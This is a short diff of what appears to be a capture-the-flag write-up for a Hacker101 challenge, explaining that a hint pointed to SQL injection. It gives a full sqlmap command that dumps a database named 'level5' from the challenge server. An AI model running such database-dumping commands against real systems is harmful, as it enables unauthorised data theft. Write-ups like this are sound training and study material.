@@ -27,7 +27,7 @@ Hints:
 - Or a query whose results I can't see, for that matter
 
 The hint 'query' pointed to a SQL injection vulnerability. <br><br>
-The previous location where  ```Flag0``` was placed revealed a database named ```level5```, ```sqlmap``` was then used to enumerate that database: <br>
+The previous location where  ```Flag0``` was placed revealed a database named ```level5```, ```sqlmap``` was then used to enumerate that database: <br><br>
 ```sqlmap -u https://d1ae6902fc23e9b5dbf9e2b75d730fcb.ctf.hacker101.com/fetch?id=1 --dump -D level5 --threads=5``` <br><br>
 <img width="938" height="283" alt="image" src="https://github.com/user-attachments/assets/52e35e44-cf5c-4599-8b85-ba0a96c56971" /> <br><br>
 
